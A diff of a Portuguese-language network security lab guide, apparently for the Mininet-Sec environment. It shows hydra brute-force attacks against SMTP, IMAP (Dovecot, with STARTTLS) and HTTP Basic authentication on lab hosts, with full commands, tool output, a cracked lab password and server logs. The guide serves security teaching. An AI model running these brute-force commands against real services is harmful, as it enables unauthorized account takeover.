@@ -477,7 +477,9 @@ cd /tmp
 curl -LO https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/refs/heads/master/OneRuleToRuleThemAll.rule
 ```
 
-### 3.2 Ataques de força-bruta contra o SMTP, IMAP e SSH
+### 3.2 Ataques de força-bruta contra o SMTP e IMAP
+
+Nesta atividade, realzaremos ataques de força bruta contra os mecanismos de autenticação dos serviços SMTP e IMAP. 
 
 Para visualizar o ataque de força bruta ocorrendo, abra o terminal do host srv102 e execute o seguinte comnado para monitorar o log das aplicações:
 ```
@@ -493,37 +495,193 @@ mnsecx h401 hydra -I -L /tmp/wordlist-login.txt -P /tmp/wordlist-password.txt sm
 
 O comando acima inicializará um ataque de força bruta contra o serviço IMAP que está em execução no srv102 (172.16.10.2). Após executar o ataque você deve visualizar uma saída como mostrado abaixo:
 ```
-root@h401:~# hydra -I -L /tmp/wordlist-username.txt -P /tmp/wordlist-password.txt imap://172.16.10.2/CLEAR
+root@mininet-sec-637b0d4f77fb4f-dc67c9b77-f2x6p:/src/mnsec# mnsecx h401 hydra -I -L /tmp/wordlist-login.txt -P /tmp/wordlist-password.txt smtp://172.16.10.2/PLAIN
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-20 20:26:12
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-29 07:52:15
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 315 login tries (l:15/p:21), ~20 tries per task
-[DATA] attacking imap://172.16.10.2:143/CLEAR
-1 of 1 target completed, 0 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-24 20:26:18
+[DATA] attacking smtp://172.16.10.2:25/PLAIN
+[25][smtp] host: 172.16.10.2   login: teste   password: hackinsdn
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-29 07:52:20
 ```
 
-No terminal do srv102, você deve visualizar as tentativas de conexão:
+No terminal do srv102, pare a execução do tail com o comando CTRL+C e visualize as tentativas de conexão:
 ```
-root@srv102:~# tail -f /tmp/mnsec/srv102/log/*.log
-==> /tmp/mnsec/srv102/log/imap.log <==
-{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "143", "password": "teste123!#", "server": "imap_server", "src_ip": "192.168.40.1", "src_port": "53138", "status": "failed", "timestamp": "2024-11-20T20:26:16.104778", "username": "user"}
-{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "143", "password": "ninja", "server": "imap_server", "src_ip": "192.168.40.1", "src_port": "53150", "status": "failed", "timestamp": "2024-11-20T20:26:16.114977", "username": "user"}
-{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "143", "password": "spark123", "server": "imap_server", "src_ip": "192.168.40.1", "src_port": "53156", "status": "failed", "timestamp": "2024-11-20T20:26:16.125113", "username": "user"}
-{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "143", "password": "0123456789", "server": "imap_server", "src_ip": "192.168.40.1", "src_port": "53162", "status": "failed", "timestamp": "2024-11-20T20:26:16.135531", "username": "user"}
+root@srv102:~# tail -f /tmp/mnsec/srv102/log/smtp.log
 ...
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "hackinsdn", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50540", "status": "success", "timestamp": "2024-10-29T07:52:17.149453", "username": "teste"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "password", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50598", "status": "failed", "timestamp": "2024-10-29T07:52:17.159672", "username": "guest"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "123456", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50568", "status": "failed", "timestamp": "2024-10-29T07:52:17.170760", "username": "guest"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "teste123", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50588", "status": "failed", "timestamp": "2024-10-29T07:52:17.171292", "username": "guest"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "abc123", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50592", "status": "failed", "timestamp": "2024-10-29T07:52:17.171531", "username": "guest"}
+...
+^C
 ```
 
-Observe que o hydra reporta não ter encontrado nenhuma combinação de credenciais válidas. Isso ocorre pois o serviço que está configurado no srv102 para simular o IMAP responde com falha de autenticação para quaisquer combinações de usuário e senha (este é um serviço leve apenas para simular um serviço real)
+Observe que o hydra reporta ter encontrado uma combinação válida de credenciais: usuário "teste" e senha "hackinsdn". Isso ocorre pois propositalmente configuramos o serviço SMTP em execuçãio no srv102 para aceitar estas credenciais, e os dicioários utilizamos continham combinações que casaram com essa configuração.
 
-TODO: alterar acima pra usar SMTP
+Vamos realizar agora um novo ataque de força-bruta, porém dessa vez contra o serviço IMAP. Nesse testes utilizamos o software Dovecot, que provê suporte aos serviços de IMAP e POP3 com TLS e diferentes mecanismos de autenticação. Por padrão, a autenticação do Dovecot é baseada nos usuários locais do Linux, portanto o primeiro passo é criar uma conta local que será alvo do ataque.
 
-TODO: iniciar o serviço SSH e realizar o ataque
+No terminal do srv102, crie uma conta local para o usuário "admin" (essa conta será criada sem um shell válido):
+```
+useradd -m -s /bin/false admin
+echo "admin:Hackinsdn123!" | chpasswd
+```
 
-TODO: iniciar o serviço IMAP e realizar o ataque, mostrar sem TLS
+Observe que a senha utilizada agora possui algumas características de segurança, como uso de letras maiúsculas e minúsculas, números e caracteres especiais.
+
+O próximo passo é iniciar o serviço Dovecot. Ainda no terminal do srv102, execute os seguintes comandos para iniciar o Dovecot e verificar seu funcionamento:
+```
+service-mnsec-dovecot.sh srv102 --start
+netstat -lnptu
+```
+
+Após executar o comando acima, o Dovecot será iniciado e estará apto a tratar requisições do protocolo IMAP e POP3 sem SSL (portas 143 e 110) e com SSL (993 e 995). A saída esperada para o comando acima é mostrado abaixo:
+```
+root@srv102:~# service-mnsec-dovecot.sh srv102 --start
+root@srv102:~# netstat -lnptu
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      45042/dovecot       
+tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      45042/dovecot       
+tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      45042/dovecot       
+tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      45042/dovecot       
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1360/python3        
+tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      43761/python3       
+tcp6       0      0 :::993                  :::*                    LISTEN      45042/dovecot       
+tcp6       0      0 :::995                  :::*                    LISTEN      45042/dovecot       
+tcp6       0      0 :::110                  :::*                    LISTEN      45042/dovecot       
+tcp6       0      0 :::143                  :::*                    LISTEN      45042/dovecot       
+```
+
+Agora vamos abrir o terminal do host h401 e executar novamente o hydra para realizar o ataque de brute-force no serviço IMAP, desta vez vamos fixar o login simulando um ataque direcionado:
+```
+hydra -I -l admin -P /tmp/wordlist-password.txt imap://172.16.10.2/PLAIN
+```
+
+Ao executar o comando acima você deverá observar uma série de erros retornados pelo hydra. A saída esperada é ilustrada abaixo:
+```
+root@h401:~# hydra -I -l admin -P /tmp/wordlist-password.txt imap://172.16.10.2/PLAIN
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-29 08:35:22
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:1/p:21), ~2 tries per task
+[DATA] attacking imap://172.16.10.2:143/PLAIN
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-29 08:35:24
+```
+
+A mensagem de erro listada acima (`IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled`) indica que os mecanismos de autenticação estão desativados quando a conexão não possui criptografia TLS/SSL (boa prática!). Portanto, temos duas opções na execução do hydra: 1) executar um STARTTLS para transformar a conexão IMAP em uma conexão segura, ou executar o Hydra na porta do IMAPS (993). Vamos executar o Hydra com STARTTLS:
+```
+hydra -I -l admin -P /tmp/wordlist-password.txt imap://172.16.10.2/TLS:PLAIN
+```
+
+Observe que nenhum erro adicional foi reportado, porém o hydra não identificou credenciais válidas:
+```
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:1/p:21), ~2 tries per task
+[DATA] attacking imap://172.16.10.2:143/TLS:PLAIN
+1 of 1 target completed, 0 valid password found
+```
+
+Isso ocorre pois o dicionário de senhas utilizado não contém a senha do usuário (bom sinal!). Na próxima atividade vamos experimentar algumas técnicas adicionais que podem ser aplicadas nesse cenário.
+
+> [!TIP]  
+> Execute o tcpdump no host srv102 (`tcpdump -i srv102-eth0 -n -vv`) para visualizar os pacotes recebidos e confirmar o uso de TLS/SSL na conexão.
 
 ### 3.3 - Ataque de brute-force com senhas geradas dinamicamente
+
+Nesta atividade vamos experimentar dois métodos que podem ser utilizados em ataques de força bruta para expandir o conjunto de senhas usadas no ataque: a) geração de senhas a partir de conjunto de caracteres; e b) mutação do dicionário de senhas a partir de combinações diversas.
+
+No Mininet-Sec, abra o Terminal do host srv103. No terminal do host srv103, execute o seguinte comando para iniciar o serviço HTTP com apache2:
+```
+service-mnsec-apach2.sh srv103 --start --login admin --pass adm123
+```
+
+O comando acima inicializará o Apache2 para prover o serviço web nos protocolos HTTP e HTTPS com um site que possui URLs protegidas por autenticação HTTP Basic e outras URLs protegidas por autenticação baseada em formulários HTML (muito comum em sites na Internet). Observe que a senha que configuramos acima (`adm123`), apesar de simples, não consta no dicionário que utilizamos anteriormente.
+
+Vamos inicialmente utilizar o hydra para tentar quebrar a senha utilizando o método de geração de senhas a partir de um conjunto de caracteres. No terminal do host h401 execute o seguinte comando:
+```
+hydra -I -V -l admin -x 6:6:aA1 https-get://172.16.10.3/admin/
+```
+
+Ao executar o comando acima, o Hydra retorna um erro (_definition for password bruteforce (-x) generates more than 4 billion passwords, it is just not feasible to try so many attempts_) informando que o conjunto de caracteres escolhido gera muitas combinações, tornando o ataque computacionalmente infactível de realizar. No comando acima combinamos letras minúsculas, maiúsculas e números (!). Vamos reduzir o conjutno de caracteres para combinar apenas letras minúsculas e números. Repita o comando acima porém agora com uma modificação:
+```
+hydra -I -V -l admin -x 6:6:a1 https-get://172.16.10.3/admin/
+```
+
+Você pode acompanhar o ataque no host srv103 através dos logs `apache2/access.log` e `apache2/error.log`, conforme ilustrado abaixo:
+```
+root@srv103:~# tail apache2/access.log 
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+root@srv103:~# tail apache2/error.log 
+[Sun Dec 29 09:10:27.745656 2024] [auth_basic:error] [pid 46417:tid 46441] [client 192.168.40.1:53960] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.756304 2024] [auth_basic:error] [pid 46416:tid 46419] [client 192.168.40.1:53962] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.765881 2024] [auth_basic:error] [pid 46417:tid 46426] [client 192.168.40.1:53976] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.765995 2024] [auth_basic:error] [pid 46416:tid 46440] [client 192.168.40.1:53980] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.766036 2024] [auth_basic:error] [pid 46417:tid 46469] [client 192.168.40.1:53978] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.776285 2024] [auth_basic:error] [pid 46417:tid 46458] [client 192.168.40.1:53984] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.776409 2024] [auth_basic:error] [pid 46416:tid 46449] [client 192.168.40.1:53996] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.786688 2024] [auth_basic:error] [pid 46416:tid 46468] [client 192.168.40.1:54008] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.796642 2024] [auth_basic:error] [pid 46416:tid 46455] [client 192.168.40.1:54010] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.807040 2024] [auth_basic:error] [pid 46417:tid 46439] [client 192.168.40.1:54018] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+```
+
+Aguarde alguns minutos e verifique se o Hydra conseguiu identificar alguma credencial válida. No terminal do host h401, pare a execução do Hydra com o comando CTRL+C. Observe que diversas tentativas foram enviadas para o servidor porém nenhuma com sucesso, e diversas outras tentativas ainda estão pendentes. Esse tipo de ataque pode gerar muito ruído na rede (exemplo: logs de falha) e facilmente ser bloqueado.
+
 
 TODO: iniciar o serviço HTTP (Basic e Form)
 
